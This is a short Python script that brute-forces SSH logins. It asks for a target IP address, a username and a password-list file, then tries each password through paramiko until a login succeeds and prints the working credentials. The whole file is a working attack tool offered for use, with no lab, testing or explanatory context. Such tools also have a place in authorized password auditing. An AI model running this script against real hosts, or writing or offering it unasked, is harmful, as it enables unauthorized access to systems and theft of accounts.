#!/usr/bin/env python
import paramiko, sys, os

def check_ssh_connection(target_ip, username, password_file):
    password_list = open(password_file, 'r')

    for password in password_list:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_ip, port=22, username=username, password=password.strip())
            client.close()

            print('Connection succeeded with Username: {} and Password: {}'.format(username, password.strip()))
            exit()

        except (paramiko.ssh_exception.SSHException) as e:
            print('Error: {} Password: {}'.format(e, password))
            continue

        except (paramiko.ssh_exception.BadAuthenticationType) as e:
            print('Username: {} and Password: {} failed. Error: {}'.format(username, password, e))
            exit()

        except (paramiko.ssh_exception.BadHostKeyException) as e:
            print('The host key given by the SSH server did not match what we were expecting. Error: {}'.format(e))
            exit()


def main():
    try:
        target_ip = str(input('TARGET IP ADDRESS: '))
        username = str(input('SSH USERNAME: '))
        password_list = input('PATH TO PASSWORD LIST: ')

        if os.path.exists(password_list) == False:
            sys.exit('\nPassword list does not exist. Please enter a valid /path/to/file')
        else:
            check_ssh_connection(target_ip, username, password_list)

    except KeyboardInterrupt:
        sys.exit('\nKeyboard Interrupt: Stopping program')



if __name__ == '__main__':
    main()